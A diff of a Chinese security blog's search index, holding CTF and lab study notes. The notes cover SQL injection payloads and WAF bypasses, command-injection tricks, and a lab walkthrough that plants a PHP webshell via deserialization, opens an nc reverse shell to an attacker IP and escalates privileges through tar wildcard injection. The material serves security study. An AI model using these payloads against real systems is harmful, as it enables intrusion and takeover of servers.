+<p>爆字段：<br><a href="http://web.jarvisoj.com:32794/index.php?table=test`" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`</a> `union select flagUwillNeverKnow from secret_flag limit 1 offset 1</p>
+</blockquote>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。<br>二次排序注入思路：</p>
+<ol>
+<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</li>
+<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li>
+<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
+<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</li>
+<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
+</ol>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，会一起执行</p>
+<p>2019 强网杯题目：随便注<br><code>inject=1&#39;; rename table</code>words<code>to</code>words1<code>;rename table</code>1919810931114514<code>to</code>words<code>;alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code></p>
+<p><code>rename table</code>words<code>to</code>words1<code>;</code>    把查询的表明改成 words1<br><code>rename table</code>1919810931114514<code>to</code>words<code>;</code>  把希望查询的表明改成 words<br><code>alter table</code>words<code>change</code>flag<code></code>id<code>varchar(50);#</code>    把 id  与 flag  值互换</p>
+<h1 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h1><p>常用：</p>
+<p>admin’ #<br>‘+’<br>‘+’<br>0<br>Aaa’=’<br>原理：<br>单引号闭合，井号注释<br><strong>select * from admin where username=’admin’ #</strong>‘ and password =’’</p>
+<p>Mysql 里 select ‘aaaaa’+1  返回的是 1，会把单引号里面的当成 0<br><strong>select * from admin where username=’’+’’ and password =’’+’’</strong><br><em>*select \</em> from admin where username=0 and password =0<br>**都可以爆出数据</p>
+<p>先 username=Aaa 为假，再与’ ‘比较为真<br><strong>select * from admin where username=’Aaa’=’’ and password =’Aaa’=’’</strong></p>
+<p>sql 注入相关文件:<a href="https://www.yuque.com/attachments/yuque/0/2019/txt/376509/1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt?_lake_card=%7B%22uid%22%3A%221563238369116-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Ftxt%2F376509%2F1563238369225-cf11ab95-d1b3-48e9-9211-e277f3985038.txt%22%2C%22name%22%3A%22A1-SQL%E6%B3%A8%E5%85%A5.txt%22%2C%22size%22%3A4612%2C%22type%22%3A%22text%2Fplain%22%2C%22ext%22%3A%22txt%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22IuS9W%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">A1-SQL 注入.txt</a></p>
+<p>各数据库注入相关:<a href="https://www.netsparker.com/" target="_blank" rel="noopener">https://www.netsparker.com/</a></p>
+<h1 id="注入-waf-绕过"><a href="#注入-waf-绕过" class="headerlink" title="注入 waf 绕过"></a>注入 waf 绕过</h1><h3 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h3><p>– hex 编码<br>SELECT _ FROM Users WHERE username = 0x61646D696E<br>– char() 函数<br>SELECT _ FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</p>
+<h3 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h3><p>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;<br>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>使用  <code>CONCAT()</code>  时，任何个参数为 null，将返回 null，推荐使用  <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code> 函数第一个参数表示用哪个字符间隔所查询的结果。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>2、Entering raw mode</title>
     <url>/2020/05/24/hvgiem/</url>
     <content><![CDATA[<p>接下来我们来尝试获取用户输入：</p>
@@ -6802,17 +7172,26 @@
 <h3 id="后台进程"><a href="#后台进程" class="headerlink" title="后台进程"></a>后台进程</h3><p>&amp;</p>
 <h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>|<br>echo ‘ls’|bash<br>把左边的输出作为右边的输入</p>
 <h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>||  &amp;&amp;</p>
-<h3 id="空格代替"><a href="#空格代替" class="headerlink" title="空格代替"></a>空格代替</h3><p>可以用下面这些来代替空格：<br>${IFS}<br>&lt;<br>$IFS<br>$IFS$9<br>%09  在 url 中传递参数<br>$a=l;$b=s;$a$b -&gt; ls</p>
-<h3 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h3><p><code>echo d2hvYW1p| base64 -d</code><br>d2hvYW1p 是 whoami 的 b64 编码<br>结果就是 whoami 的结果</p>
+<h3 id="空格代替"><a href="#空格代替" class="headerlink" title="空格代替"></a>空格代替</h3><p>可以用下面这些来代替空格：<br>${IFS}<br>&lt;<br>$IFS<br>$IFS$9（这个数字随意）<br>%09  在 url 中传递参数<br>$a=l;$b=s;$a$b -&gt; ls</p>
+<h3 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h3><p><code>echo d2hvYW1p| base64 -d</code><br>d2hvYW1p 是 whoami 的 b64 编码<br>结果就是 whoami 的结果<br>echo Y2F0IGZsYWcucGhw|base64 -d|sh</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599440211509-b3ed7e41-5631-405d-85ad-65e4d67c3810.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=192&originWidth=860&size=107153&status=done&style=none&width=595" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
 <p>额，备份一下</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563845977709-c22d71e7-1823-40a5-941a-7a67e88e7c4d.png#align=left&display=inline&height=521&name=WJ%5D%5DVZ%25Z%40SDL4%24A%28%7D%5DB~%5B%7BC.png&originHeight=521&originWidth=958&size=330536&status=done&style=none&width=958" alt="WJ]]VZ%Z@SDL4$A(}]B~[{C.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563845977709-c22d71e7-1823-40a5-941a-7a67e88e7c4d.png#align=left&display=inline&height=521&margin=%5Bobject%20Object%5D&name=WJ%5D%5DVZ%25Z%40SDL4%24A%28%7D%5DB~%5B%7BC.png&originHeight=521&originWidth=958&size=330536&status=done&style=none&width=958" alt="WJ]]VZ%Z@SDL4$A(}]B~[{C.png" title="">
                 </div>
                 <div class="image-caption">WJ]]VZ%Z@SDL4$A(}]B~[{C.png</div>
             </figure>
 
+<p>可以直接 cat <code>ls</code><br>把反引号内的命令输出作为输入给 cat</p>
 <h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>比如：ls|sleep 3<br>延时 3 秒，就说明执行了命令</p>
 <h3 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h3><h3 id="DNS-请求"><a href="#DNS-请求" class="headerlink" title="DNS 请求"></a>DNS 请求</h3><p>CEYE</p>
 <h2 id="可控字符串长度受限"><a href="#可控字符串长度受限" class="headerlink" title="可控字符串长度受限"></a>可控字符串长度受限</h2><h3 id="15-个可控字符"><a href="#15-个可控字符" class="headerlink" title="15 个可控字符"></a>15 个可控字符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(_FILE_);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -12280,6 +12659,137 @@
 ]]></content>
   </entry>
   <entry>
+    <title>pipe</title>
+    <url>/2020/08/31/rsk0kc/</url>
+    <content><![CDATA[<p>nmap 扫描端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598848717656-16ad154e-ad70-4d4f-83b3-f1101d0f40db.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&name=image.png&originHeight=765&originWidth=668&size=163655&status=done&style=none&width=530" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>扫描目录出来个 scriptz</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598850111403-a68e0a6a-e1d4-4a79-ae0c-a9ca8b2d55ab.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=100&originWidth=485&size=11206&status=done&style=stroke&width=429" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问得到一个 js 一个 bak</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598850154394-2d6486c8-2497-41ff-988d-2f379f8a27e7.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&name=image.png&originHeight=322&originWidth=529&size=26225&status=done&style=stroke&width=264.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问下载<br>是一个 Log 类，后面析构函数实现了把 data 写到 filename 里面</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;data, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后构造一个序列化字符串，给他 index.php 发过去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Log&quot;:2:&#123;s:8:&quot;filename&quot;;s:31:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;scriptz&#x2F;shell.php&quot;;s:4:&quot;data&quot;;s:29:&quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>url 编码一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%4f%3a%33%3a%22%4c%6f%67%22%3a%32%3a%7b%73%3a%38%3a%22%66%69%6c%65%6e%61%6d%65%22%3b%73%3a%33%31%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%63%72%69%70%74%7a%2f%73%68%65%6c%6c%2e%70%68%70%22%3b%73%3a%34%3a%22%64%61%74%61%22%3b%73%3a%32%39%3a%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%3b%7d</span><br></pre></td></tr></table></figure>
+
+<p>然后给 index.php 发过去，这样就在 scriptz 目录下生成一个 shell.php 的一句话</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598862549181-344aabb9-421f-414f-8f77-24f657b3e5d2.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1915&size=383130&status=done&style=stroke&width=957.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598862455627-3b72bbc1-39f3-4f4f-953d-e1facffa43a5.png#align=left&display=inline&height=295&margin=%5Bobject%20Object%5D&name=image.png&originHeight=381&originWidth=555&size=41031&status=done&style=stroke&width=429" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>nc 反弹个 shell<br><code>http://192.168.149.199/scriptz/shell.php?cmd=nc -e /bin/bash 192.168.149.1 6666</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598862661834-089eee9b-f774-45af-b802-f7ab955da62a.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=299&originWidth=861&size=221580&status=done&style=none&width=526" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>打开一个交互的 shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>由于在 /home/rene/backup 目录下有一些备份文件，每分钟一个，所以可能有啥任务计划之类的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598871267482-c66d11f5-dc96-41f1-8f7a-7647f0bd6f53.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&name=image.png&originHeight=276&originWidth=688&size=247431&status=done&style=none&width=509" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598871207594-27f16a15-a1ba-4182-afae-52ae4a4ab0d3.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&name=image.png&originHeight=487&originWidth=1232&size=766626&status=done&style=none&width=679" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>其中那个 /usr/bin/compress.sh 可以读到，看到他做了这么些事情</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598871426039-75eab029-c82b-4df1-b006-c10a0220bf3d.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=699&size=228454&status=done&style=none&width=539" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这里用到了 tar 提权<br>tar 选项中有一个 –checkpoint-action 当 –checkpoint-action=exec=command 时可以用来执行命令<br>当 –checkpoint=1 时可以用来显示信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot; &gt; --checkpoint-action&#x3D;exec&#x3D;sh\ shell.sh;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1;</span><br><span class="line">echo &#39;chmod u+s &#x2F;bin&#x2F;dash&#39; &gt; shell.sh</span><br><span class="line">chmod 777 shell.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598872665243-9e8e8523-64f6-4bad-87ab-f9bfd6c50776.png#align=left&display=inline&height=347&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1054&size=725026&status=done&style=none&width=682" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后等着 corn 运行 tar 就能拿到 shell<br>看着他的 bak 文件多了然后再没了就差不多了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598872923394-5ed24da7-38a5-419d-8a48-5a1db8380b86.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=image.png&originHeight=317&originWidth=944&size=374113&status=done&style=none&width=617" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这时候 /bin/dash 就可以啦</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598873043087-532204b3-7cce-46a6-90b7-4e3e44bce0fe.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=516&size=73971&status=done&style=none&width=325" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598873085818-7eb9e052-6896-46db-9ff2-ad77c271d667.png#align=left&display=inline&height=514&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1027&originWidth=1824&size=2235507&status=done&style=none&width=912" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
     <title>内存取证</title>
     <url>/2019/11/16/seedcu/</url>
     <content><![CDATA[<h1 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h1><p>在 kali 下直接使用就好</p>
@@ -17229,376 +17739,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install       \</span><br><span class="line">    cmake                  \</span><br><span class="line">    build-essential        \</span><br><span class="line">    libboost-dev           \</span><br><span class="line">    libqt5xmlpatterns5-dev \</span><br><span class="line">    qtbase5-dev            \</span><br><span class="line">    qt5-default            \</span><br><span class="line">    libqt5svg5-dev         \</span><br><span class="line">    libgraphviz-dev        \</span><br><span class="line">    libcapstone-dev        \</span><br><span class="line">    pkg-config</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line"><span class="built_in">cd</span> edb-debugger</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/ ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 
 <p>安装完成后直接在命令行里使用  edb 运行</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>SQL注入</title>
-    <url>/2019/11/10/hgohr1/</url>
-    <content><![CDATA[<h1 id="环境相关"><a href="#环境相关" class="headerlink" title="环境相关"></a>环境相关</h1><p>phpstudy：<br><a href="https://www.xp.cn" target="_blank" rel="noopener">https://www.xp.cn</a></p>
-<p>sqli-labs：<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<p>sublime：<br><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">https://www.sublimetext.com/</a></p>
-<p>具体搭建方式可以参考网上的教程<br>这里提供看雪论坛的一个在线 sqli-labs：<a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p>
-<h1 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h1><p>数据在数据库中是按照表单的方式存储的，在 phpstudy 里面，可以很方便的打开 mysql 终端<br>（打开后输入默认密码 root）</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461842773-c072384e-87c2-4b75-bfc6-8247ac3ea217.png#align=left&display=inline&height=250&name=image.png&originHeight=499&originWidth=928&size=301910&status=done&style=none&width=464" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>使用  <code>show databases;</code>  命令可以查看所有的数据库名<br>我的存在数据库：information_schema，challenges，mysql，performance_schema，security，test，yichen</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461099740-907a0ae6-9bb7-4a99-9973-2fb0937a448e.png#align=left&display=inline&height=313&name=image.png&originHeight=341&originWidth=363&size=20251&status=done&style=none&width=333" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>其中：<strong>information_schema</strong> 数据库是 MySQL 自带的，在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。数据库里面几张重要的表的状态我放在这，如果后面涉及这几张表不太明白可以回来看一下</p>
-<p><code>use yichen;</code>  用来选择想要使用的数据库</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461487799-565a79c5-5278-4aee-8057-dca7d3b59a95.png#align=left&display=inline&height=82&name=image.png&originHeight=91&originWidth=241&size=5533&status=done&style=none&width=218" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>使用  <code>show tables;</code>  来显示数据库中的所有数据表</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461593350-90cbee18-612b-4b6f-ac1a-e065bae4e209.png#align=left&display=inline&height=149&name=image.png&originHeight=212&originWidth=308&size=11196&status=done&style=none&width=217" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>使用  <code>select * from yichen;</code>  来查看数据表”yichen”中所有的数据信息</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573461958036-f609eaaa-922f-4eb2-a954-48f7d4eefe39.png#align=left&display=inline&height=146&name=image.png&originHeight=220&originWidth=376&size=19901&status=done&style=none&width=250" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>数据表：yichen 中一共有三列数据，列名分别是：id，name，age<br>如果想查看 yichen 表中 writeup 的年龄应该怎样那？<br>有两种简单的方法：<br><code>select age from yichen where name=&#39;writeup&#39;;</code><br><code>select age from yichen where id=2;</code><br>这里需要注意的是 name 字段属于字符串，所以需要用单引号引起来</p>
-<p>那其实当我们访问一个网页上的时候比如 sqli-labs 的第一关：<br>?id=1 实际上就是去数据库里面查询 id=1 的时候的 name 和 password 列的值</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573462434520-3b672c43-8219-48a4-bef9-095410f4a486.png#align=left&display=inline&height=284&name=image.png&originHeight=568&originWidth=1920&size=189095&status=done&style=none&width=960" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>补充一些关于 information_schema 数据库的数据表的信息：</p>
-<p><strong>SCHEMATA 表：</strong>提供了当前 mysql 中所有数据库的信息（主要用来查询数据库名（schema_name））</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474150129-3f2bd79e-a202-4e8e-b856-0aafde35fa82.png#align=left&display=inline&height=168&name=image.png&originHeight=350&originWidth=1338&size=163038&status=done&style=none&width=644" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p><strong>TABLES 表：</strong>提供了关于数据库中的表的信息（包括视图）(有点乱…)</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472943149-8b1d46ce-6403-48f5-8ac8-f213e5ffc4b5.png#align=left&display=inline&height=223&name=image.png&originHeight=486&originWidth=1270&size=113816&status=done&style=none&width=582" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>在 phpmyadmin 里可以看的清楚点（主要用来查询数据表名 (table_name)）</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474346090-85d104c4-c093-464b-8af4-5ef3b1c300c3.png#align=left&display=inline&height=189&name=image.png&originHeight=340&originWidth=887&size=64474&status=done&style=none&width=494" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p><strong>COLUMNS 表：</strong>提供了表中的列信息（主要用来查询字段名（column_name））</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573474209881-b5b2a5cf-5a19-420b-ad6f-fbb690f1ff67.png#align=left&display=inline&height=157&name=image.png&originHeight=313&originWidth=1043&size=66447&status=done&style=none&width=521.5" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<h1 id="sql-注入原理"><a href="#sql-注入原理" class="headerlink" title="sql 注入原理"></a>sql 注入原理</h1><p>前面提到访问?id=1 的时候就是去数据库里查询 id=1 的字段的值，那么，当我不去正常访问 id=1 而是访问一个 id=1’会发生什么？报错了！</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463020241-ea253b3e-aecf-4e98-b0b8-0be5199c9291.png#align=left&display=inline&height=271&name=image.png&originHeight=542&originWidth=1373&size=172843&status=done&style=none&width=686.5" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>看报错的回显发现<br>您的 SQL 语法有误； 检查与您的 MySQL 服务器版本相对应的手册以获取正确的语法，以在第 1 行的’’1’’ LIMIT 0,1’附近使用<br>仔细看一下，’’1’’ LIMIT 0,1’，会发现单引号是这么配对的<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573463731758-49360687-a0f8-4af2-97c5-12069ba95d80.png#align=left&display=inline&height=54&name=image.png&originHeight=112&originWidth=456&size=6056&status=done&style=none&width=219" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure></p>
-<p>也就是说我们输入的 1’  去查询的时候出问题了，我们可以查看一下 less-1 的源代码，找到查询语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))<span class="comment">//使用get方式接受一个参数id</span></span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];<span class="comment">//把get得到的id的值赋给变量id</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;<span class="comment">//使用这条语句去查询</span></span><br><span class="line">$result=mysql_query($sql);<span class="comment">//把查询的结果给result这个变量</span></span><br><span class="line">$row = mysql_fetch_array($result);<span class="comment">//把结果变成了数组的形式</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)<span class="comment">//如果得到结果就把他展示出来↓</span></span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="comment">//没有得到结果就展示mysql操作产生的文本错误信息</span></span><br><span class="line">	&#123;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们只要关心这一句<br><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>
